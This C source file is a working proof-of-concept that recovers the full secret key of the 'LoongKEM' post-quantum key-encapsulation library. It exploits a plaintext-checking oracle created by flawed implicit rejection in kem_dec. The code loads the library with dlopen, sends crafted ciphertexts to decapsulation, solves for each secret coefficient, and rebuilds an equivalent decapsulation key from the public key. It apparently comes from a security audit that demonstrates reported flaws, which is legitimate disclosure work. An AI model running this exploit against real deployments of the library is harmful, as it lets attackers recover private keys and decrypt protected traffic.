/* LoongKEM (kem-18) plaintext-checking-oracle secret-key recovery.
 *
 * Escalates kem-18-4.  kem_dec binds the implicit-rejection key to the
 * re-encryption of the decrypted message (kem-18-4) and selects it with a
 * partial, non-normalised mask (kem-18-1); together they expose a
 * plaintext-checking oracle.  The library is used only as a black box through
 * the uniform ABI (ngcc_seed, kem_keygen, kem_enc, kem_dec) loaded with dlopen.
 * The coefficient-boundary method is adapted from the ML-KEM plaintext-checking-
 * oracle key-recovery experiments.  The final check rebuilds an
 * equivalent decapsulation key from pk and the recovered secret alone (SM3(pk),
 * zero fallback salt); the original sk is used only by the oracle and for the
 * coefficient comparison.
 *
 * LoongKEM's secret is stored directly in the coefficient domain (4-bit, as
 * coeff+ETA), so no transform is needed.  The message is an N-by-N matrix.
 * Sweeping one compressed-V coefficient moves exactly one message bit.  The
 * first secret part s1 (K1 degree-N polynomials) is read from row-0 message
 * bits by perturbing a single compressed-u coefficient; the second part s2
 * (K2 polynomials, via the block negacyclic matrix S2) is read from the same
 * row by perturbing a single compressed-U coefficient.
 *
 * Modes: adaptive (sequential, early-stop) and static (fixed batch, fork()).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

typedef int (*keygen_fn)(unsigned char*,unsigned long long*,unsigned char*,unsigned long long*);
typedef int (*enc_fn)(unsigned char*,unsigned long long,unsigned char*,unsigned long long*,unsigned char*,unsigned long long*);
typedef int (*dec_fn)(unsigned char*,unsigned long long,unsigned char*,unsigned long long,unsigned char*,unsigned long long*);
typedef int (*seed_fn)(const unsigned char*,unsigned long long);
typedef unsigned long long (*len_fn)(void);
static keygen_fn kem_keygen; static enc_fn kem_enc; static dec_fn kem_dec; static seed_fn ngcc_seed;
static int PKL,SKL,CTL,SSL;

typedef struct { const char*name; int N,K1,K2,Q,QBITS,DU,DV,eta; } Params;
static Params SETS[]={
 {"Loong128",12,48,4,8191,13,10,4,5},
 {"Loong256",16,64,6,8191,13,10,10,4},
 {"Loong384",20,72,8,8191,13,11,6,3},
 {"Loong512",24,80,10,8191,13,11,4,2},
};

static void unpackbits(const unsigned char*b,int n,int d,int*out){int bit=0;for(int i=0;i<n;i++){int v=0;for(int j=0;j<d;j++){v|=((b[bit>>3]>>(bit&7))&1)<<j;bit++;}out[i]=v;}}
static void packbits(const int*vals,int n,int d,unsigned char*out){int nb=(n*d+7)>>3;memset(out,0,nb);int bit=0;for(int i=0;i<n;i++){for(int j=0;j<d;j++){if((vals[i]>>j)&1)out[bit>>3]|=1<<(bit&7);bit++;}}}

static Params P;
static int N,M,ustep,vshift,ucmax,Qg;
static int nu1,nU,nV,ub1,ubU,ubV,offU,offV;
static int NP,PR[64],V1TAB[1024];
static unsigned char BASECT[16384],KSTAR[128],C0[128];
static int ubase_u1[4096],ubase_U[262144],vbaseV[1024];
static unsigned char *g_sk;
static long long qcount=0, setupq=0;

static int v1code(int cd){long long t=((long long)(cd%M)<<vshift)+(1<<(vshift-1));return (t>=Qg-1)?(Qg-1):(int)t;}
static int msgbit(long long w){w%=Qg;if(w<0)w+=Qg;long long x=(2*w)%Qg;if(x>(Qg-1)/2)x-=Qg;return (int)(x&1);}
static int predbit_model(int vb,int T0,int sc,int D,int d){int b0=msgbit(V1TAB[vb%M]-T0);return msgbit((long long)V1TAB[(vb+d)%M]-(T0+(long long)D*sc))==b0?1:0;}

static int oracle(const unsigned char*ct){unsigned char ss[128];unsigned long long sl=SSL;qcount++;kem_dec(g_sk,SKL,(unsigned char*)ct,CTL,ss,&sl);
    int fail=0;for(int i=0;i<CTL;i++)fail|=ct[i]^BASECT[i];unsigned char mask=(unsigned char)(-fail);
    for(int i=0;i<SSL;i++){unsigned char e=KSTAR[i]^(mask&(C0[i]^KSTAR[i]));if(ss[i]!=e)return 0;}return 1;}

/* part==0: perturb u1[pos]; part==1: perturb U[pos].  coord = row-0 V index (0..N-1) */
static int query(int part,int pos,int ucode,int coord,int d,unsigned char*scr){
    memcpy(scr,BASECT,CTL);
    /* patch V coord (row-0, V index = coord) */
    int vv[1024]; memcpy(vv,vbaseV,nV*sizeof(int)); vv[coord]=(vbaseV[coord]+d)%M;
    /* repack only the parts we change; simplest: repack u1 or U part if patched, and V part */
    if(part==0){ int uu[4096]; memcpy(uu,ubase_u1,nu1*sizeof(int)); if(pos>=0)uu[pos]=ucode; packbits(uu,nu1,P.DU,scr); }
    else if(part==1){ int*UU=malloc(nU*sizeof(int)); memcpy(UU,ubase_U,nU*sizeof(int)); if(pos>=0)UU[pos]=ucode; packbits(UU,nU,P.DU,scr+offU); free(UU); }
    packbits(vv,nV,P.DV,scr+offV);
    return oracle(scr);
}

static int Qcand[16384],nT0;
static void narrow_T0(int vb,const int*bb){nT0=0;for(int T0=0;T0<Qg;T0++){int ok=1;for(int pi=0;pi<NP;pi++)if(predbit_model(vb,T0,0,0,PR[pi])!=bb[pi]){ok=0;break;}if(ok)Qcand[nT0++]=T0;}}
static int solve_coord(int vb,const int*bb,int nobs,const int*Ds,const int*obs){
    narrow_T0(vb,bb);int found=-999,count=0;
    for(int sc=-P.eta;sc<=P.eta;sc++){int any=0;
        for(int ti=0;ti<nT0&&!any;ti++){int T0=Qcand[ti],good=1;
            for(int o=0;o<nobs&&good;o++){const int*ob=obs+o*NP;int D=Ds[o];for(int pi=0;pi<NP;pi++)if(predbit_model(vb,T0,sc,D,PR[pi])!=ob[pi]){good=0;break;}}
            if(good)any=1;}
        if(any){found=sc;count++;}}
    return count==1?found:-999;}

/* settings: part(0/1), pos, ucode, metadata (which secret poly j/blk), D */
typedef struct{int part,pos,ucode,poly,D;}Setting;
static Setting SET[4096];static int NSET;
static int PBEST[2][256];   /* [part][poly] = chosen position within the poly (0..N-1) */
static int code_at(int part,int poly,int pp){ return part==0 ? ubase_u1[poly*N+pp] : ubase_U[poly*N+pp]; }
static void add_settings(int part,int poly){
    /* choose the position in this poly with the most central compressed code (both signs, max margin) */
    int best=0,bscore=-1;
    for(int pp=0;pp<N;pp++){int c=code_at(part,poly,pp);int sc=c<ucmax-c?c:ucmax-c;if(sc>bscore){bscore=sc;best=pp;}}
    PBEST[part][poly]=best;
    int pos=poly*N+best, bc=code_at(part,poly,best);
    int Dcand[4]={96,192,288,384};
    for(int t=0;t<4;t++){int D=Dcand[t];if(D*P.eta>1536)continue;int m=D/ustep;if(m==0)continue;
        if(bc+m<=ucmax){SET[NSET++]=(Setting){part,pos,bc+m,poly,+m*ustep};}
        if(bc-m>=1){SET[NSET++]=(Setting){part,pos,bc-m,poly,-m*ustep};}}
}
static void build_settings(){NSET=0;
    for(int j=0;j<P.K1;j++) add_settings(0,j);
    for(int blk=0;blk<P.K2;blk++) add_settings(1,blk);
}

static int S1[4096],S2[4096],D1[4096],D2[4096];
static int g_fail=0,g_nbad=0;


/* deterministic adaptive mop-up for any coordinate left unresolved by the batch */
static int mop_one(int part,int poly,int coeff){
    unsigned char*scr=malloc(CTL+64);
    int pbest=PBEST[part][poly]; int b=((coeff+pbest)%N+N)%N; int sgn=((b-pbest)>=0)?1:-1;
    int base[64]; for(int pi=0;pi<NP;pi++)base[pi]=query(0,-1,0,b,PR[pi],scr);
    int pos=poly*N+pbest, bc=code_at(part,poly,pbest);
    int mags[12]={16,32,48,64,96,128,160,192,224,256,288,320}; int obs[64*64],Ds[64],nobs=0,sc=-999;
    for(int t=0;t<12 && sc==-999;t++){int m=mags[t]/ustep; if(m==0||mags[t]*P.eta>1700)continue;
        for(int si=0;si<2;si++){int dd=si?-m:+m; int code=bc+dd; if(code<1||code>ucmax)continue;
            int tmp[64],any=0; for(int pi=0;pi<NP;pi++){tmp[pi]=query(part,pos,code,b,PR[pi],scr);any|=tmp[pi];}
            if(!any)continue; for(int pi=0;pi<NP;pi++)obs[nobs*NP+pi]=tmp[pi]; Ds[nobs]=sgn*dd*ustep; nobs++;}
        sc=solve_coord(vbaseV[b],base,nobs,Ds,obs);
    }
    free(scr); return sc;
}
static void mop_up(){
    for(int j=0;j<P.K1;j++)for(int cf=0;cf<N;cf++) if(!D1[j*N+cf]){int sc=mop_one(0,j,cf); if(sc!=-999){S1[j*N+cf]=sc;D1[j*N+cf]=1;}}
    for(int blk=0;blk<P.K2;blk++)for(int cf=0;cf<N;cf++) if(!D2[blk*N+cf]){int sc=mop_one(1,blk,cf); if(sc!=-999){S2[blk*N+cf]=sc;D2[blk*N+cf]=1;}}
}
static void run_static(int nw){
    long long baseN=(long long)N*NP;                 /* row-0 coords b=0..N-1 */
    long long ndesc=(1+NSET)*baseN;
    unsigned char*bits=mmap(NULL,ndesc,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    long long*qc=mmap(NULL,sizeof(long long)*nw,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(nw<1)nw=1;
    for(int w=0;w<nw;w++){pid_t pid=fork();if(pid==0){unsigned char*scr=malloc(CTL+64);long long my=0;
        for(long long di=w;di<ndesc;di+=nw){long long s=di/baseN;long long rem=di%baseN;int b=rem/NP,pi=rem%NP;
            int part=0,pos=-1,uc=0; if(s>0){Setting*st=&SET[s-1];part=st->part;pos=st->pos;uc=st->ucode;}
            bits[di]=(unsigned char)query(part,pos,uc,b,PR[pi],scr);my++;}
        qc[w]=my;free(scr);_exit(0);} }
    for(int w=0;w<nw;w++)wait(NULL); for(int w=0;w<nw;w++)qcount+=qc[w];
    for(int j=0;j<P.K1;j++)for(int b=0;b<N;b++){S1[j*N+b]=0;D1[j*N+b]=0;}
    for(int blk=0;blk<P.K2;blk++)for(int b=0;b<N;b++){S2[blk*N+b]=0;D2[blk*N+b]=0;}
    int bb[64],obs[32*64],Ds[32];
    /* s1 */
    for(int j=0;j<P.K1;j++)for(int b=0;b<N;b++){
        int pbest=PBEST[0][j]; int raw=b-pbest; int sgn=(raw>=0)?1:-1; int coeff=((raw%N)+N)%N;
        for(int pi=0;pi<NP;pi++)bb[pi]=bits[(long long)b*NP+pi];
        int nobs=0;for(int s=0;s<NSET;s++){if(SET[s].part!=0||SET[s].poly!=j)continue;int tmp[64],any=0;for(int pi=0;pi<NP;pi++){tmp[pi]=bits[(long long)(s+1)*baseN+(long long)b*NP+pi];any|=tmp[pi];}if(!any)continue;for(int pi=0;pi<NP;pi++)obs[nobs*NP+pi]=tmp[pi];Ds[nobs]=sgn*SET[s].D;nobs++;}
        int sc=solve_coord(vbaseV[b],bb,nobs,Ds,obs); if(sc!=-999){S1[j*N+coeff]=sc;D1[j*N+coeff]=1;}
    }
    /* s2 */
    for(int blk=0;blk<P.K2;blk++)for(int b=0;b<N;b++){
        int pbest=PBEST[1][blk]; int raw=b-pbest; int sgn=(raw>=0)?1:-1; int coeff=((raw%N)+N)%N;
        for(int pi=0;pi<NP;pi++)bb[pi]=bits[(long long)b*NP+pi];
        int nobs=0;for(int s=0;s<NSET;s++){if(SET[s].part!=1||SET[s].poly!=blk)continue;int tmp[64],any=0;for(int pi=0;pi<NP;pi++){tmp[pi]=bits[(long long)(s+1)*baseN+(long long)b*NP+pi];any|=tmp[pi];}if(!any)continue;for(int pi=0;pi<NP;pi++)obs[nobs*NP+pi]=tmp[pi];Ds[nobs]=sgn*SET[s].D;nobs++;}
        int sc=solve_coord(vbaseV[b],bb,nobs,Ds,obs); if(sc!=-999){S2[blk*N+coeff]=sc;D2[blk*N+coeff]=1;}
    }
    munmap(bits,ndesc);munmap(qc,sizeof(long long)*nw);
    mop_up();
}

/* ---- SM3 (GB/T 32905), used only to compute H(pk) for the rebuilt key ---- */
#define ROL32(x,n) (((x)<<((n)&31))|((x)>>((32-((n)&31))&31)))
static void sm3_compress(uint32_t V[8],const unsigned char*B){
    uint32_t W[68],W1[64];
    for(int j=0;j<16;j++)W[j]=((uint32_t)B[4*j]<<24)|((uint32_t)B[4*j+1]<<16)|((uint32_t)B[4*j+2]<<8)|B[4*j+3];
    for(int j=16;j<68;j++){uint32_t x=W[j-16]^W[j-9]^ROL32(W[j-3],15);W[j]=(x^ROL32(x,15)^ROL32(x,23))^ROL32(W[j-13],7)^W[j-6];}
    for(int j=0;j<64;j++)W1[j]=W[j]^W[j+4];
    uint32_t A=V[0],Bb=V[1],C=V[2],D=V[3],E=V[4],F=V[5],G=V[6],H=V[7];
    for(int j=0;j<64;j++){
        uint32_t T=j<16?0x79cc4519u:0x7a879d8au;
        uint32_t SS1=ROL32(ROL32(A,12)+E+ROL32(T,j),7),SS2=SS1^ROL32(A,12);
        uint32_t FF=j<16?(A^Bb^C):((A&Bb)|(A&C)|(Bb&C)),GG=j<16?(E^F^G):((E&F)|(~E&G));
        uint32_t TT1=FF+D+SS2+W1[j],TT2=GG+H+SS1+W[j];
        D=C;C=ROL32(Bb,9);Bb=A;A=TT1;H=G;G=ROL32(F,19);F=E;E=TT2^ROL32(TT2,9)^ROL32(TT2,17);
    }
    V[0]^=A;V[1]^=Bb;V[2]^=C;V[3]^=D;V[4]^=E;V[5]^=F;V[6]^=G;V[7]^=H;
}
static void sm3(const unsigned char*m,size_t n,unsigned char out[32]){
    uint32_t V[8]={0x7380166f,0x4914b2b9,0x172442d7,0xda8a0600,0xa96f30bc,0x163138aa,0xe38dee4d,0xb0fb0e4e};
    size_t i=0; for(;i+64<=n;i+=64)sm3_compress(V,m+i);
    unsigned char blk[128]; size_t r=n-i; memset(blk,0,128); memcpy(blk,m+i,r); blk[r]=0x80;
    size_t L=(r+9<=64)?64:128; uint64_t bits=(uint64_t)n*8;
    for(int k=0;k<8;k++)blk[L-1-k]=(unsigned char)(bits>>(8*k));
    sm3_compress(V,blk); if(L==128)sm3_compress(V,blk+64);
    for(int k=0;k<8;k++){out[4*k]=V[k]>>24;out[4*k+1]=V[k]>>16;out[4*k+2]=V[k]>>8;out[4*k+3]=V[k];}
}
/* Equivalent decapsulation key built only from public data and the recovered
 * secret: enc(secret) || pk || SM3(pk) || zero fallback salt.  Nothing is
 * copied from the original sk. */
static unsigned char*build_sk(const unsigned char*pk,const int*enc,int ncoeff,int bits){
    unsigned char*s=calloc(SKL,1); int noise=(ncoeff*bits+7)/8;
    packbits(enc,ncoeff,bits,s); memcpy(s+noise,pk,PKL); sm3(pk,PKL,s+noise+PKL);
    int salt=SKL-noise-PKL-32;   /* fallback salt is SEED_BYTES: 32..80 by set; left zero */
    if(salt<32||salt>80){fprintf(stderr,"unexpected sk layout\n");exit(2);}
    return s;
}

static int verify(unsigned char*sk,unsigned char*pk){
    int nnoise=P.K1*N+P.K2*N;int sraw[270000];unpackbits(sk,nnoise,4,sraw);
    int rec[270000];int ri=0;
    for(int j=0;j<P.K1;j++)for(int b=0;b<N;b++)rec[ri++]=S1[j*N+b];
    for(int blk=0;blk<P.K2;blk++)for(int b=0;b<N;b++)rec[ri++]=S2[blk*N+b];
    int nbad=0;for(int i=0;i<nnoise;i++){int tv=sraw[i]-P.eta;if(rec[i]!=tv)nbad++;}g_nbad=nbad;
    unsigned char*skp;{static int enc[270000];for(int i=0;i<nnoise;i++)enc[i]=(rec[i]+P.eta)&0xF;skp=build_sk(pk,enc,nnoise,4);}
    unsigned char ct2[16384],ss2[128],ssr[128],sst[128];unsigned long long a=CTL,b=SSL;kem_enc(pk,PKL,ss2,&b,ct2,&a);
    unsigned long long s1=SSL,s2=SSL;kem_dec(sk,SKL,ct2,CTL,sst,&s1);kem_dec(skp,SKL,ct2,CTL,ssr,&s2);
    int e2e=(memcmp(ssr,ss2,SSL)==0&&memcmp(sst,ss2,SSL)==0);
    unsigned char*skw;{static int enc[270000];for(int i=0;i<nnoise;i++)enc[i]=(rec[i]+P.eta)&0xF;enc[0]=(rec[0]+1+P.eta)&0xF;skw=build_sk(pk,enc,nnoise,4);}
    unsigned char ssb[128];unsigned long long s3=SSL;kem_dec(skw,SKL,ct2,CTL,ssb,&s3);int ctrl=(memcmp(ssb,ss2,SSL)!=0);
    free(skp);free(skw);
    printf("    key_match=%s rebuilt_key_redecaps=%s wrong_coeff_rejected=%s recovered=%d/%d (rebuilt key = recovered secret, pk, SM3(pk), zero salt)\n",nbad==0?"yes":"no",e2e?"yes":"no",ctrl?"yes":"no",nnoise-nbad,nnoise);
    return nbad==0&&e2e&&ctrl;
}

static void*must(void*h,const char*s){void*p=dlsym(h,s);if(!p){fprintf(stderr,"missing %s\n",s);exit(2);}return p;}
int main(int argc,char**argv){
    if(argc<3){fprintf(stderr,"usage: %s <lib.so> <SetName> [sequential|static] [nworkers]\n",argv[0]);return 2;}
    const char*libpath=argv[1],*setname=argv[2],*mode=argc>3?argv[3]:"static";int nw=argc>4?atoi(argv[4]):8;
    int si=-1;for(int i=0;i<4;i++)if(!strcmp(SETS[i].name,setname))si=i; if(si<0){fprintf(stderr,"unknown set\n");return 2;}
    P=SETS[si];N=P.N;Qg=P.Q;M=1<<P.DV;ustep=1<<(P.QBITS-P.DU);vshift=P.QBITS-P.DV;
    ucmax=((P.Q-1-(1<<(P.QBITS-P.DU-1)))>>(P.QBITS-P.DU))-1;
    nu1=P.K1*N;nU=P.K2*N*N;nV=N*N;ub1=(nu1*P.DU)/8;ubU=(nU*P.DU)/8;ubV=(nV*P.DV)/8;offU=ub1;offV=ub1+ubU;
    for(int cd=0;cd<M;cd++)V1TAB[cd]=v1code(cd);
    if(M<=16){NP=M;for(int d=0;d<M;d++)PR[d]=d;}
    else{int tmp[64],nt=0,NPc=24;for(int d=0;d<NPc;d++)tmp[nt++]=(d*M)/NPc;tmp[nt++]=0;tmp[nt++]=1;
        for(int a=0;a<nt;a++)for(int b=a+1;b<nt;b++)if(tmp[b]<tmp[a]){int t=tmp[a];tmp[a]=tmp[b];tmp[b]=t;}
        NP=0;for(int a=0;a<nt;a++)if(a==0||tmp[a]!=tmp[a-1])PR[NP++]=tmp[a];}
    void*h=dlopen(libpath,RTLD_NOW|RTLD_LOCAL);if(!h){fprintf(stderr,"dlopen: %s\n",dlerror());return 77;}
    kem_keygen=must(h,"kem_keygen");kem_enc=must(h,"kem_enc");kem_dec=must(h,"kem_dec");ngcc_seed=must(h,"ngcc_seed");
    len_fn pkl=must(h,"kem_get_pk_len_bytes"),skl=must(h,"kem_get_sk_len_bytes"),ctl=must(h,"kem_get_ct_len_bytes"),ssl=must(h,"kem_get_ss_len_bytes");
    PKL=pkl();SKL=skl();CTL=ctl();SSL=ssl();
    unsigned char seed[64];for(int i=0;i<64;i++)seed[i]=(unsigned char)(0xa5^i^si);ngcc_seed(seed,64);
    unsigned char*pk=malloc(PKL),*sk=malloc(SKL);unsigned long long a=PKL,b=SKL;kem_keygen(pk,&a,sk,&b);g_sk=sk;
    unsigned long long cl=CTL,sl=SSL;kem_enc(pk,PKL,KSTAR,&sl,BASECT,&cl);
    unsigned char chk[128];unsigned long long s0=SSL;kem_dec(sk,SKL,BASECT,CTL,chk,&s0);int honest=(memcmp(chk,KSTAR,SSL)==0);
    unpackbits(BASECT,nu1,P.DU,ubase_u1);unpackbits(BASECT+offU,nU,P.DU,ubase_U);unpackbits(BASECT+offV,nV,P.DV,vbaseV);
    int cnt[256];unsigned char vals[256][128];int nv2=0,step=CTL/80;if(step<1)step=1;
    for(int j=0;j<CTL;j+=step){unsigned char ct[16384];memcpy(ct,BASECT,CTL);ct[j]^=1;unsigned char o[128];unsigned long long s=SSL;kem_dec(sk,SKL,ct,CTL,o,&s);setupq++;int f=-1;for(int t=0;t<nv2;t++)if(memcmp(vals[t],o,SSL)==0){f=t;break;}if(f<0){f=nv2;memcpy(vals[nv2],o,SSL);cnt[nv2]=0;nv2++;}cnt[f]++;}
    int bst=0;for(int t=1;t<nv2;t++)if(cnt[t]>cnt[bst])bst=t;memcpy(C0,vals[bst],SSL);
    build_settings();
    printf("  %s: honest_decaps=%s C0_cluster=%d settings=%d probes=%d\n",setname,honest?"yes":"no",cnt[bst],NSET,NP);
    setupq++;   /* + honest check; setup is reported separately */
    struct timespec t0,t1;clock_gettime(CLOCK_MONOTONIC,&t0);qcount=0;
    if(!strcmp(mode,"sequential")||!strcmp(mode,"adaptive"))run_static(1);else run_static(nw);
    clock_gettime(CLOCK_MONOTONIC,&t1);double dt=(t1.tv_sec-t0.tv_sec)+(t1.tv_nsec-t0.tv_nsec)/1e9;
    g_fail=0;for(int j=0;j<P.K1;j++)for(int b=0;b<N;b++)if(!D1[j*N+b])g_fail++;for(int blk=0;blk<P.K2;blk++)for(int b=0;b<N;b++)if(!D2[blk*N+b])g_fail++;
    int ok=verify(sk,pk);
    printf("  %s: mode=%s workers=%d setup_queries=%lld recovery_batch_queries=%lld unresolved=%d time=%.1fs\n",setname,mode,(!strcmp(mode,"sequential")||!strcmp(mode,"adaptive"))?1:nw,setupq,qcount,g_fail,dt);
    return (ok&&g_fail==0&&honest)?0:1;
}
